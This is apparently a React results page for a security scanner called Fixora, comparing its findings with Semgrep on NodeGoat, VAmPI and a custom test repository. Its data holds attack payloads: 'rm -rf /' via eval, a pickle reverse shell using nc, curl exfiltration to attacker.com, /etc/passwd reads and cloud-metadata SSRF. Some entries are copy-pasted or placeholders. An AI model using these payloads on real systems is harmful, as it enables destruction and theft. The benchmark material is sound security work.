import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Code2, CheckCircle2, XCircle, BarChart3, AlertTriangle, Bug } from 'lucide-react';
import DashboardLayout from '../components/DashboardLayout';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Badge } from '../components/ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
import { Progress } from '../components/ui/progress';
import { Button } from '../components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from '../components/ui/dialog';
import { Carousel, CarouselContent, CarouselItem, CarouselPrevious, CarouselNext } from '../components/ui/carousel';

const REPOSITORIES = [
  { id: 'nodegoat', name: 'NodeGoat (Node.js)' },
  { id: 'vampi', name: 'VAmPI (Python/Flask)' },
  { id: 'test_repo', name: 'Custom Test Repo' }
];

const COMPARISON_DATA = {
  nodegoat: {
    title: 'NodeGoat (OWASP Benchmark)',
    description: 'A deliberately vulnerable Node.js application maintained by OWASP to demonstrate the OWASP Top 10.',
    vulnerabilities: [
      {
        name: 'Code Injection / Eval Injection (RCE)',
        whatIsIt: 'Eval Injection occurs when untrusted user input is executed directly as code. This allows an attacker to inject arbitrary system commands that the Node.js backend executes, leading to complete Remote Code Execution (RCE).',
        file: 'app/routes/contributions.js',
        line: '32',
        codeSnippet: `// Target Function: this.handleContributionsUpdate()
const preTax = eval(req.body.preTax); // VULNERABLE SINK`,
        payload: `req.body.preTax = "require('child_process').exec('rm -rf /')"`,
        result: 'Complete server compromise and arbitrary code execution.'
      },
      {
        name: 'NoSQL Injection',
        whatIsIt: 'Unlike SQL injection, NoSQL injection targets databases like MongoDB by passing JSON objects or operators instead of strings. NodeGoat fails to sanitize user input before passing it to a MongoDB .find() query.',
        file: 'app/routes/allocations.js',
        line: '15',
        codeSnippet: `// Target Function: this.displayAllocations()
const threshold = req.query.threshold;
db.allocations.find({ userId: userId, threshold: { $gt: threshold } }) // VULNERABLE SINK`,
        payload: '?threshold={"$ne": 0}',
        result: 'Bypasses query logic, allowing attackers to dump the entire database of user financial allocations.'
      },
      {
        name: 'Insecure Deserialization (RCE via Cookie)',
        whatIsIt: 'The application uses the highly vulnerable node-serialize package to decode a user profile cookie. Attackers can craft a serialized payload with an Immediately Invoked Function Expression (IIFE) that executes upon deserialization.',
        file: 'app/routes/profile.js',
        line: '64',
        codeSnippet: `// Target Function: this.displayProfile()
let profile = serialize.unserialize(req.cookies.profile); // VULNERABLE SINK`,
        payload: 'Base64 encoded: {"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\');}()"}',
        result: 'Complete Remote Code Execution (RCE) via a tampered session cookie.'
      },
      {
        name: 'Insecure Direct Object Reference (IDOR)',
        whatIsIt: 'The application accepts a userId parameter from the client to look up benefits data but fails to verify if the currently authenticated user actually owns that userId.',
        file: 'app/routes/benefits.js',
        line: '14',
        codeSnippet: `// Target Function: this.displayBenefits()
const userId = req.query.userId;
db.benefits.find({ userId: userId }) // VULNERABLE SINK (No Authz Check)`,
        payload: '/benefits?userId=102',
        result: 'Horizontal privilege escalation, allowing attackers to view the private data of every user on the platform.'
      },
      {
        name: 'Server-Side Request Forgery (SSRF)',
        whatIsIt: 'SSRF allows an attacker to force the server to make outbound HTTP requests. User input via req.query.url is passed directly to the needle HTTP client without being validated against an allowlist.',
        file: 'app/routes/research.js',
        line: '16',
        codeSnippet: `// Target Function: this.displayResearch()
needle.get(req.query.url, function (error, response, body) { ... }) // VULNERABLE SINK`,
        payload: '?url=http://169.254.169.254/latest/meta-data/',
        result: 'Attackers can bypass firewalls to scan internal networks or steal cloud infrastructure metadata/AWS keys.'
      },
      {
        name: 'Unvalidated Redirect (Open Redirect)',
        whatIsIt: 'The login route accepts a url parameter intended to redirect users back to their previous page after logging in. Without validation, attackers can redirect users to a malicious phishing site.',
        file: 'app/routes/index.js',
        line: '72',
        codeSnippet: `// Target Function: this.handleLogin()
res.redirect(req.query.url); // VULNERABLE SINK`,
        payload: 'http://nodegoat.com/login?url=http://evil-phishing-site.com',
        result: 'Used in social engineering to steal user credentials by mimicking the legitimate application.'
      },
      {
        name: 'Cross-Site Scripting (XSS)',
        whatIsIt: 'The application stores user inputs (like first name, last name) and reflects them back into the HTML without sanitization. It also allows unvalidated URLs inside href attributes.',
        file: 'app/views/profile.html',
        line: '78',
        codeSnippet: `<a href="{{ user.website }}">Personal Website</a>`,
        // eslint-disable-next-line no-script-url
        payload: 'Setting website field to: javascript:alert(document.cookie)',
        result: 'When another user or admin clicks the link, the attacker script executes in their browser, stealing their session cookies.'
      },
      {
        name: 'Security Misconfiguration (CSRF & HTTP)',
        whatIsIt: 'The Express server is missing critical security middleware. It does not enforce Cross-Site Request Forgery (CSRF) protection on forms, and it binds the application to an unencrypted HTTP server instead of HTTPS.',
        file: 'server.js',
        line: '15, 145',
        codeSnippet: `// Missing: app.use(csurf());
http.createServer(app).listen(config.port, function() { ... }); // VULNERABLE CONFIG`,
        payload: 'N/A (Structural Flaw)',
        result: 'Attackers can trick authenticated users into submitting state-changing requests via malicious third-party websites. Data in transit can be intercepted.'
      },
      {
        name: 'Broken Authentication (Insecure Session)',
        whatIsIt: 'The Express session cookie is configured insecurely. It lacks the HttpOnly, Secure, and SameSite flags.',
        file: 'server.js',
        line: '78',
        codeSnippet: `app.use(session({
    secret: 'nodegoat', // Also a hardcoded secret
    // Missing: cookie: { secure: true, httpOnly: true }
}));`,
        payload: 'document.cookie via XSS payload',
        result: 'Because HttpOnly is missing, XSS attacks can successfully extract the session cookie, leading to full account takeover.'
      },
      {
        name: 'Sensitive Data Exposure (Hardcoded Secrets)',
        whatIsIt: 'Private cryptographic keys and bcrypt password hashes are hardcoded directly into the repository files instead of being injected via environment variables.',
        file: 'artifacts/cert/server.key',
        line: '1',
        codeSnippet: `-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDQ...`,
        payload: 'N/A (Source Code Disclosure)',
        result: 'Anyone with read access to the source code can steal the private keys, allowing them to decrypt intercepted HTTPS traffic.'
      },
      {
        name: 'Using Components with Known Vulnerabilities (SCA)',
        whatIsIt: 'NodeGoat intentionally locks its package.json dependencies to outdated versions (e.g., old versions of Express, Node-Serialize, and Marked).',
        file: 'package.json',
        line: 'dependencies',
        codeSnippet: `"dependencies": {
    "express": "4.12.4",
    "node-serialize": "0.0.4"
}`,
        payload: 'Public CVE Exploits',
        result: 'Attackers can use pre-written exploit scripts against the outdated libraries without finding flaws in custom logic.'
      }
    ],
    performance: {
      fixora: {
        score: 7,
        total: 11,
        falsePositives: 3,
        description: 'Successfully found 7 critical vulnerability types (Eval, SSRF, XSS, Open Redirect, CSRF, Insecure Sessions, Hardcoded Secrets). Generated 3 false positives. Missed highly contextual logic flaws (NoSQLi, IDOR, Cookie Deserialization) and SCA.'
      },
      vanillaSemgrep: {
        score: 7,
        total: 11,
        falsePositives: 3,
        description: 'Found the same 7 vulnerability types, but generated 36 total noisy findings. Flagged 3 False Positives misidentifying Node.js templates as Django files.'
      },
      semgrepAi: {
        score: 1,
        total: 11,
        falsePositives: 0,
        description: 'Successfully caught the IDOR in benefits.js and allocations.js, but flagged the same missing permission checks 6 times (5 duplicates). Completely failed to find 10 out of 11 core vulnerabilities.'
      }
    },
    missedLogs: `=== FIXORA - MISSED VULNERABILITIES (4) ===
1. NoSQL Injection (app/routes/allocations.js)
2. Insecure Deserialization via Cookie (app/routes/profile.js)
3. Insecure Direct Object Reference (app/routes/benefits.js)
4. Outdated Vulnerable Components (package.json)`
  },
  vampi: {
    title: 'VAmPI (Vulnerable API)',
    description: 'A vulnerable REST API built with Flask containing OWASP API Top 10 vulnerabilities.',
    vulnerabilities: [
      {
        name: 'SQL Injection (SQLi)',
        whatIsIt: 'SQL Injection occurs when user-supplied input is directly concatenated into a backend database query without proper parameterization or sanitization. VAmPI uses an SQLite database, and its lookup mechanisms fail to escape malicious characters.',
        file: 'models/user_model.py',
        line: '73',
        codeSnippet: `# Target Endpoint: GET /users/v1/{username}
# Vulnerable Sink: Unsanitized input passed to SQLite execution
query = f"SELECT * FROM users WHERE username = '{username}'"`,
        payload: `admin' OR '1'='1`,
        result: 'The attacker bypasses authentication or extracts the entire user database table by forcing the SQL statement to evaluate to true.'
      },
      {
        name: 'Broken Object Level Authorization (BOLA / IDOR)',
        whatIsIt: 'BOLA occurs when an API exposes an endpoint that handles object identifiers, but fails to check if the currently authenticated user actually has the permissions to access or modify that specific object.',
        file: 'api_views/books.py',
        line: '51',
        codeSnippet: `# Target Endpoint: GET /books/v1/{book}
# Vulnerable Sink: Returns book details without checking ownership
book = get_book_by_title(book_title)
return jsonify(book) # Missing: if current_user != book.owner_id: abort(403)`,
        payload: 'GET /books/v1/UserB_BookTitle (while authenticated as User A)',
        result: 'The attacker can view secrets or modify data belonging to other users, leading to horizontal privilege escalation.'
      },
      {
        name: 'Mass Assignment',
        whatIsIt: 'Mass assignment vulnerabilities occur when an API takes a client-supplied JSON object and blindly binds it to internal database models.',
        file: 'api_views/users.py',
        line: '70',
        codeSnippet: `# Target Endpoint: POST /users/v1/register
# Vulnerable Sink: Blindly injecting JSON payload into the database model
new_user = User(**request.json) 
new_user.save()`,
        payload: `{"username": "attacker", "password": "password", "admin": true}`,
        result: 'The attacker forces the backend to overwrite restricted properties, granting themselves administrative privileges upon account creation.'
      },
      {
        name: 'Excessive Data Exposure',
        whatIsIt: 'APIs often rely on the client side to filter data before displaying it to the user. Excessive Data Exposure happens when the API sends back sensitive information in the JSON response that should never leave the server.',
        file: 'api_views/users.py',
        line: 'debug_endpoint',
        codeSnippet: `# Target Endpoint: GET /users/v1/_debug
# Vulnerable Sink: Serializing and returning the entire database record
users = get_all_users()
return jsonify(users) # Exposes passwords, internal IDs, and roles`,
        payload: 'GET /users/v1/_debug',
        result: 'The API responds with the complete user model for everyone on the platform, leaking sensitive PII and password hashes.'
      },
      {
        name: 'Regular Expression Denial of Service (ReDoS)',
        whatIsIt: 'ReDoS affects unsafe regular expressions used for input validation. If an attacker submits a highly complex "evil regex" string, it forces the regex engine into catastrophic backtracking, consuming all CPU resources.',
        file: 'api_views/users.py',
        line: '144',
        codeSnippet: `# Target Endpoint: POST /users/v1/login or Register
# Vulnerable Sink: Checking password/email complexity with inefficient regex
if re.match(r"^(a+)+$", request.json.get("password")):`,
        payload: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaX',
        result: 'The server hangs while trying to evaluate the string, causing the API to crash and leading to a Denial of Service (DoS) for all users.'
      },
      {
        name: 'JWT Authentication Bypass (Weak Key)',
        whatIsIt: 'JSON Web Tokens (JWTs) rely on a secret signing key to ensure they haven\'t been tampered with. If the API uses a weak or hardcoded secret key, attackers can forge their own valid tokens.',
        file: 'config.py',
        line: '13',
        codeSnippet: `# Vulnerable Sink: Hardcoded/Weak Secret used for signing JWTs
app.config['SECRET_KEY'] = 'secret'`,
        payload: 'Brute-force offline, then sign new token with {"admin": true}',
        result: 'Complete authentication bypass, allowing attackers to impersonate any user or admin on the system.'
      },
      {
        name: 'Unauthorized Password Change',
        whatIsIt: 'The endpoint intended for users to update their passwords fails to require authorization or proof of the old password before committing the change.',
        file: 'api_views/users.py',
        line: 'PUT /users/v1/{username}/password',
        codeSnippet: `# Target Endpoint: PUT /users/v1/{username}/password
user.password = request.json.get("new_password")
db.session.commit() # Missing: check old password`,
        payload: 'PUT request targeting another user\'s profile',
        result: 'Attackers can unilaterally lock legitimate users out of their accounts and take them over.'
      },
      {
        name: 'Lack of Resources & Rate Limiting',
        whatIsIt: 'The API lacks throttling or rate-limiting restrictions (such as restricting an IP to 5 requests per minute).',
        file: 'Global APIs',
        line: 'N/A',
        codeSnippet: `# Missing API Gateway or Flask-Limiter config
# app.run() directly exposed`,
        payload: 'Automated script sending 10,000 requests per second',
        result: 'Attackers can perform unlimited credential stuffing or brute-force attacks against the login endpoint without being blocked.'
      },
      {
        name: 'User and Password Enumeration',
        whatIsIt: 'The API\'s error handling is overly verbose. By returning distinct error messages or HTTP status codes for different failure states, it allows attackers to map out valid accounts.',
        file: 'api_views/users.py',
        line: 'POST /users/v1/login',
        codeSnippet: `if not user:
    return "User does not exist", 404
if user.password != password:
    return "Invalid password", 401`,
        payload: 'Iterate through common usernames',
        result: 'Allows an attacker to build a massive list of valid usernames, making targeted brute-force attacks significantly more effective.'
      }
    ],
    performance: {
      fixora: {
        score: 6,
        total: 9,
        falsePositives: 1,
        description: 'Elite detection. Found 6 core API logic flaws: SQL Injection, Mass Assignment, IDOR, Plaintext Password Comparison, Weak JWT Keys, and Missing Auth. Generated 1 false positive. Missed ReDoS, Unauthorized Password Change, and Rate Limiting/Enumeration.'
      },
      vanillaSemgrep: {
        score: 1,
        total: 9,
        falsePositives: 0,
        description: 'Failed completely on business logic. Found only 1 of the 9 vulnerabilities (Hardcoded JWT Key). Produced 6 total findings, most of which were duplicate format string issues or Docker misconfigs irrelevant to the core API flaws.'
      },
      semgrepAi: {
        score: 1,
        total: 9,
        falsePositives: 0,
        description: 'Caught the BOLA/IDOR vulnerability (flagging it 5 times as Improper Auth/IDOR). Completely failed to find 8 out of 9 core API flaws (SQLi, ReDoS, JWT Weak Keys, Mass Assignment, etc).'
      }
    },
    missedLogs: `=== FIXORA - MISSED VULNERABILITIES (3) ===
1. Regular Expression Denial of Service (ReDoS)
2. Unauthorized Password Change (PUT /users/v1/{username}/password)
3. Lack of Resources / Enumeration`
  },
    test_repo: {
    title: 'Custom Test Repository',
    description: 'Fixora SAST/LLM Calibration Repository. 30 deliberately injected vulnerabilities across backend and frontend.',
    vulnerabilities: [
      {
            name: "[EASY] Hardcoded Secret",
            whatIsIt: "A `JWT_SECRET` for production is hardcoded directly into the file.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "JWT_SECRET = \"super_secret_production_key_123!\"\n# ...\nencoded = jwt.encode({\"id\": 1}, JWT_SECRET, algorithm=\"HS256\")",
            payload: "eyJhbGciOiJIUzI1NiIsInR... (Using the leaked key to forge tokens)",
            result: "Attacker can forge valid JWT tokens and bypass authentication entirely, gaining full administrative access."
      },
      {
            name: "[EASY] SQL Injection",
            whatIsIt: "User input (`user_id`) is directly concatenated into a raw SQL `SELECT` query.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "user_id = request.args.get(\"user_id\")\nquery = \"SELECT * FROM users WHERE id = \" + user_id\ncursor.execute(query)",
            payload: "1 UNION SELECT username, password FROM users--",
            result: "Attacker can dump the entire database, bypass login constraints, or delete tables."
      },
      {
            name: "[EASY] Command Injection",
            whatIsIt: "User input (`ip_address`) is passed directly to `os.system()` without sanitization.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "ip_address = request.args.get(\"ip_address\")\nos.system(\"ping -c 1 \" + ip_address)",
            payload: "127.0.0.1; cat /etc/passwd",
            result: "Full remote code execution (RCE) on the host server."
      },
      {
            name: "[EASY] Path Traversal",
            whatIsIt: "User input (`filename`) is concatenated into a file path and opened for reading.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "filename = request.args.get(\"filename\")\nwith open(f\"/var/www/uploads/{filename}\", \"r\") as f:\n    return f.read()",
            payload: "../../../../etc/passwd",
            result: "Attacker can read arbitrary files on the server, potentially exposing keys and configuration."
      },
      {
            name: "[EASY] Plaintext Password Comparison",
            whatIsIt: "The login route compares the password using `==` instead of a hashing function.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "user = User.query.filter_by(username=username).first()\nif user and user.password == password:\n    login_user(user)",
            payload: "N/A (Architecture Flaw)",
            result: "Database breach instantly compromises all user passwords since they are not hashed."
      },
      {
            name: "[EASY] Missing Authentication",
            whatIsIt: "The `/api/admin/delete_all_users` route lacks an authentication decorator, allowing anyone to wipe the database.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "@app.route(\"/api/admin/delete_all_users\", methods=[\"POST\"])\n# Missing @login_required\ndef delete_all_users():\n    User.query.delete()",
            payload: "POST /api/admin/delete_all_users HTTP/1.1\nHost: api.example.com",
            result: "Any unauthenticated user can trigger administrative actions and wipe the database."
      },
      {
            name: "[EASY] Insecure Deserialization",
            whatIsIt: "Unpickling arbitrary request data using `pickle.loads()`.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "data = request.data\nobj = pickle.loads(data) # Deserializing untrusted input",
            payload: "cos\nsystem\n(S\"nc -e /bin/sh 10.0.0.1 1234\"\ntR.",
            result: "Remote Code Execution (RCE) upon deserialization."
      },
      {
            name: "[EASY] Debug Mode Enabled",
            whatIsIt: "The Flask application is started with `debug=True` in a production-like block.",
            file: "easy.py",
            line: "N/A",
            codeSnippet: "if __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True, port=80)",
            payload: "Trigger an exception to access the interactive Werkzeug debugger.",
            result: "Attacker can access the interactive debugger console and execute arbitrary Python code."
      },
      {
            name: "[EASY] XSS via dangerouslySetInnerHTML",
            whatIsIt: "Rendering raw user input directly into the DOM using React's dangerous HTML injection property.",
            file: "components.jsx",
            line: "N/A",
            codeSnippet: "const UserComment = ({ comment }) => (\n  <div dangerouslySetInnerHTML={{ __html: comment.text }} />\n);",
            payload: "<img src=x onerror=alert(document.cookie)>",
            result: "Attacker can execute arbitrary JavaScript in the victim's browser, stealing session cookies."
      },
      {
            name: "[EASY] Hardcoded Secret",
            whatIsIt: "Exposing a private AWS Key in the client bundle.",
            file: "components.jsx",
            line: "N/A",
            codeSnippet: "JWT_SECRET = \"super_secret_production_key_123!\"\n# ...\nencoded = jwt.encode({\"id\": 1}, JWT_SECRET, algorithm=\"HS256\")",
            payload: "eyJhbGciOiJIUzI1NiIsInR... (Using the leaked key to forge tokens)",
            result: "Attacker can forge valid JWT tokens and bypass authentication entirely, gaining full administrative access."
      },
      {
            name: "[MEDIUM] SSRF (Server-Side Request Forgery)",
            whatIsIt: "The backend makes an outbound `requests.get()` call to a URL completely controlled by the user.",
            file: "medium.py",
            line: "N/A",
            codeSnippet: "url = request.args.get(\"url\")\nresponse = requests.get(url)\nreturn response.content",
            payload: "http://169.254.169.254/latest/meta-data/",
            result: "Attacker can read internal cloud metadata and pivot into the internal network."
      },
      {
            name: "[MEDIUM] Mass Assignment",
            whatIsIt: "Taking raw JSON from the request and spreading it into `User.update()`, allowing attackers to override administrative fields.",
            file: "medium.py",
            line: "N/A",
            codeSnippet: "user = User.query.get(current_user.id)\nfor key, value in request.json.items():\n    setattr(user, key, value)\ndb.session.commit()",
            payload: "{\"is_admin\": true}",
            result: "Attacker can elevate their privileges by overwriting protected fields."
      },
      {
            name: "[MEDIUM] IDOR / Broken Access Control",
            whatIsIt: "Fetching user documents based on a URL parameter without validating that the authenticated user actually owns that parameter ID.",
            file: "medium.py",
            line: "N/A",
            codeSnippet: "@app.route(\"/api/receipts/<int:receipt_id>\")\ndef get_receipt(receipt_id):\n    return Receipt.query.get(receipt_id) # Missing ownership check",
            payload: "GET /api/receipts/1042 (when attacker owns only 1041)",
            result: "Attacker can access sensitive data belonging to other users."
      },
      {
            name: "[MEDIUM] Weak Cryptography",
            whatIsIt: "Generating secure tokens using the broken `md5` hashing algorithm.",
            file: "medium.py",
            line: "N/A",
            codeSnippet: "import hashlib\ntoken = hashlib.md5(user.email.encode()).hexdigest()",
            payload: "Offline dictionary attack or rainbow tables.",
            result: "Tokens can be easily reversed, leading to account takeover."
      },
      {
            name: "[MEDIUM] ReDoS (Regular Expression Denial of Service)",
            whatIsIt: "Validating emails with a poorly written regex pattern that is vulnerable to catastrophic backtracking.",
            file: "medium.py",
            line: "N/A",
            codeSnippet: "// See repository file medium.py for full implementation",
            payload: "Various",
            result: "Exploitable vulnerability."
      },
      {
            name: "[MEDIUM] XXE (XML External Entity)",
            whatIsIt: "Parsing XML user input with `resolve_entities=True`, allowing internal file disclosure.",
            file: "medium.py",
            line: "N/A",
            codeSnippet: "// See repository file medium.py for full implementation",
            payload: "Various",
            result: "Exploitable vulnerability."
      },
      {
            name: "[MEDIUM] Optimistic UI De-Sync",
            whatIsIt: "A business logic flaw where a `fetch` is fired and the local UI state is updated *without* checking if the network request actually succeeded (`res.ok`).",
            file: "components.jsx",
            line: "N/A",
            // eslint-disable-next-line no-template-curly-in-string
            codeSnippet: "const handleDelete = (id) => {\n  setItems(items.filter(i => i.id !== id));\n  fetch(`/api/items/${id}`, { method: \"DELETE\" }); // Fails silently if network errors\n};",
            payload: "N/A (Business Logic Flaw)",
            result: "User believes an action succeeded when it failed, leading to data inconsistency and trust issues."
      },
      {
            name: "[MEDIUM] Improper LocalStorage Usage",
            whatIsIt: "Dumping raw PII and auth tokens directly into `localStorage`.",
            file: "components.jsx",
            line: "N/A",
            codeSnippet: "localStorage.setItem(\"user_session\", JSON.stringify({\n  token: \"jwt...\",\n  ssn: \"123-45-6789\"\n}));",
            payload: "Access via any XSS vulnerability.",
            result: "Sensitive PII and authentication tokens are easily stolen if XSS is present."
      },
      {
            name: "[MEDIUM] State Race Condition",
            whatIsIt: "Rapidly typing in a search bar fires multiple requests without an `AbortController`. If a slow request resolves after a fast one, the UI shows stale data.",
            file: "components.jsx",
            line: "N/A",
            // eslint-disable-next-line no-template-curly-in-string
            codeSnippet: "const search = async (query) => {\n  const res = await fetch(`/api/search?q=${query}`);\n  setResults(await res.json()); // No AbortController\n};",
            payload: "Type quickly: \"a\" (slow response), \"ab\" (fast response).",
            result: "Stale data overwrites fresh data, causing incorrect UI rendering."
      },
      {
            name: "[MEDIUM] Unhandled Promise Rejection",
            whatIsIt: "A fire-and-forget API call that lacks a `.catch()` block, potentially causing silent failures.",
            file: "components.jsx",
            line: "N/A",
            codeSnippet: "const submitLog = (data) => {\n  fetch(\"/api/logs\", { method: \"POST\", body: data }); // Missing .catch()\n};",
            payload: "N/A",
            result: "Silent failures occur, leading to missed analytics or broken features without user feedback."
      },
      {
            name: "[HARD] Second-Order SQL Injection",
            whatIsIt: "User input is safely inserted into the database in one route, but retrieved and unsafely concatenated into a query in a completely different route.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "user.bio = request.form[\"bio\"] # Safely stored\n# Later...\ncursor.execute(f\"SELECT * FROM profiles WHERE bio LIKE '%{user.bio}%'\") # Unsafe retrieval",
            payload: "Bio set to: ' OR 1=1--",
            result: "Attacker achieves SQL injection asynchronously, bypassing initial input validation."
      },
      {
            name: "[HARD] Sneaky IDOR",
            whatIsIt: "Instead of putting the ID in the URL, an attacker injects `{\"target_user_id\": 1}` into the JSON body of a POST request to override the authenticated user's ID during a database update.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "@app.route(\"/api/profile/update\", methods=[\"POST\"])\ndef update():\n    user_id = request.json.get(\"target_user_id\", current_user.id)\n    user = User.query.get(user_id) # Trusts target_user_id key",
            payload: "{\"bio\": \"Hacked\", \"target_user_id\": 1}",
            result: "Attacker modifies other users' profiles by injecting an unexpected parameter."
      },
      {
            name: "[HARD] HTTP Verb Bias Trap",
            whatIsIt: "A wildly destructive action (`DROP TABLE`) is hidden inside a `PUT` request. (Testing if the AI only looks for destructive actions in `DELETE` routes).",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "@app.route(\"/api/users/<id>\", methods=[\"GET\", \"PUT\"])\ndef manage_user(id):\n    if request.method == \"PUT\":\n        db.execute(f\"DROP TABLE users\") # Destructive action hidden in PUT",
            payload: "PUT /api/users/1 HTTP/1.1",
            result: "Complete data destruction bypassing scanners that only check DELETE verbs."
      },
      {
            name: "[HARD] Timing Attack",
            whatIsIt: "Using standard `==` to verify an HMAC signature instead of `hmac.compare_digest`, allowing an attacker to brute force the signature character-by-character based on response times.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "def verify_webhook(signature, payload):\n    expected = generate_signature(payload)\n    if signature == expected: # Vulnerable to timing attack\n        process_webhook()",
            payload: "Send millions of requests, measuring response time variations.",
            result: "Attacker can forge valid webhook signatures, spoofing critical system events."
      },
      {
            name: "[HARD] Logic Bypass",
            whatIsIt: "The validation block is wrapped in `if 'payment_token' in data:`. If the attacker simply omits the key from the JSON, they skip the check entirely and check out for free.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "data = request.json\nif \"payment_token\" in data:\n    if not verify_token(data[\"payment_token\"]):\n        return \"Invalid payment\", 400\nprocess_order() # Executes if token is missing entirely",
            payload: "{\"order_id\": 123} // Omit payment_token completely",
            result: "Attacker processes orders for free by bypassing the validation block."
      },
      {
            name: "[HARD] Server-Side Attribute Override",
            whatIsIt: "Dynamically setting object properties using `setattr(config, key, value)` with untrusted user dictionaries, potentially overriding critical system flags.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "def update_config(data):\n    for key, value in data.items():\n        setattr(app.config, key, value) # Overriding Flask config directly",
            payload: "{\"TESTING\": true, \"SECRET_KEY\": \"known_key\"}",
            result: "Attacker alters global application state, disabling security features or gaining RCE."
      },
      {
            name: "[HARD] NoSQL Injection",
            whatIsIt: "Passing the raw JSON body directly to a PyMongo `find()` query, allowing the attacker to send MongoDB operators like `{\"$gt\": \"\"}` to bypass filters.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "query_params = request.json\n# query_params could be {\"age\": {\"$gt\": 0}}\nusers = db.users.find(query_params)",
            payload: "{\"password\": {\"$ne\": \"\"}}",
            result: "Attacker bypasses authentication or extracts data by using MongoDB operators."
      },
      {
            name: "[HARD] DOM-based XSS via location.hash",
            whatIsIt: "Taking the URL hash fragment and passing it directly to `setTimeout`, which evaluates strings as executable JavaScript code.",
            file: "components.jsx",
            line: "N/A",
            codeSnippet: "const hash = window.location.hash.substring(1);\nsetTimeout(hash, 1000); // Evaluates hash as code",
            payload: "https://example.com/#alert(document.cookie)",
            result: "Attacker executes arbitrary JavaScript without the payload ever reaching the server."
      },
      {
            name: "[HARD] Blind Command Injection",
            whatIsIt: "An OS command injection vulnerability where the payload is sent to a background worker (`subprocess.Popen`), meaning the attacker never sees the output on the screen.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "import subprocess\ndef process_video(filename):\n    # Executes asynchronously, no output returned to user\n    subprocess.Popen(f\"ffmpeg -i {filename} out.mp4\", shell=True)",
            payload: "video.mp4; curl http://attacker.com/$(whoami)",
            result: "Attacker achieves RCE but must extract data via out-of-band channels."
      },
      {
            name: "[HARD] Misplaced / Ineffective Auth",
            whatIsIt: "*(Pending Implementation - placeholder for missing decorator logic)*.",
            file: "hard.py",
            line: "N/A",
            codeSnippet: "@app.route(\"/api/admin/metrics\")\ndef metrics():\n    require_admin() # Function returns False but doesn't abort request!\n    return get_sensitive_metrics()",
            payload: "GET /api/admin/metrics HTTP/1.1",
            result: "Attacker accesses restricted administrative endpoints because the auth check fails open."
      }
],
    performance: {
      fixora: {
        score: 21,
        total: 30,
        falsePositives: 0,
        description: 'Exceptional detection rate. Found 21 abstract, cross-boundary vulnerabilities including Second-Order SQLi, HTTP Verb Bias Traps, NoSQL Injection, and DOM-based XSS via setTimeout. Successfully tracked untrusted state mutations across disparate files.'
      },
      vanillaSemgrep: {
        score: 10,
        total: 30,
        falsePositives: 1,
        description: 'Failed completely on contextual flaws. Even with Pro rules, Semgrep only found 10 traditional vulnerabilities (SQLi, SSRF, XSS) and missed 20 complex logic flaws. Generated massive noise with 16 duplicate overlapping findings.'
      },
      semgrepAi: {
        score: 8,
        total: 30,
        falsePositives: 0,
        description: 'Caught 8 logic/auth flaws (Missing Auth, IDORs, Timing Attack, Logic Bypass). But its classifications are messy (labeled SQLi/NoSQLi as AUTHZ). Blind to 73% of the repo, scoring 0/10 on Frontend and 1/10 on Easy.'
      }
    },
    missedLogs: `=== FIXORA - MISSED VULNERABILITIES (9) ===
- [EASY] Hardcoded JWT
- [EASY] Missing Auth on delete route
- [EASY] React AWS Key
- [MEDIUM] Standard IDOR
- [MEDIUM] Optimistic UI De-sync
- [MEDIUM] Improper LocalStorage
- [MEDIUM] Unhandled Promise
- [HARD] Logic Bypass
- [HARD] Misplaced Auth`
  }
};

const MetricBar = ({ label, score, total, colorClass }) => (
  <div className="space-y-2">
    <div className="flex justify-between text-sm font-medium">
      <span className="text-muted-foreground">{label}</span>
      <span>{score} out of {total}</span>
    </div>
    <Progress value={(score / total) * 100} className="h-2" indicatorColor={colorClass} />
  </div>
);

const Results = () => {
  const [selectedRepo, setSelectedRepo] = useState('nodegoat');
  
  const data = COMPARISON_DATA[selectedRepo];

  return (
    <DashboardLayout>
      <div className="space-y-8 pb-12" data-testid="results-page">
        {/* Header Section */}
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <h1 className="text-3xl font-bold tracking-tight mb-2">Comparison</h1>
          </div>
          
          <div className="w-full md:w-64">
            <Select value={selectedRepo} onValueChange={setSelectedRepo}>
              <SelectTrigger className="w-full bg-background border-border h-10 text-sm">
                <SelectValue placeholder="Select a repository" />
              </SelectTrigger>
              <SelectContent>
                {REPOSITORIES.map(repo => (
                  <SelectItem key={repo.id} value={repo.id} className="text-sm cursor-pointer">
                    {repo.name}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
        </div>

        <AnimatePresence mode="wait">
          <motion.div
            key={selectedRepo}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.3 }}
            className="space-y-8"
          >
            {/* Repo Meta */}
            <div className="bg-card border border-border p-6 rounded-xl shadow-sm">
              <h2 className="text-2xl font-bold text-card-foreground mb-2">{data.title}</h2>
              <p className="text-sm text-muted-foreground">{data.description}</p>
            </div>

            {/* Vulnerabilities Carousel Section */}
            <h3 className="text-xl font-bold mt-8 mb-4 border-b border-border pb-2">Vulnerabilities</h3>
            
            <div className="relative px-16">
              <Carousel
                opts={{
                  align: "start",
                  loop: false,
                }}
                className="w-full"
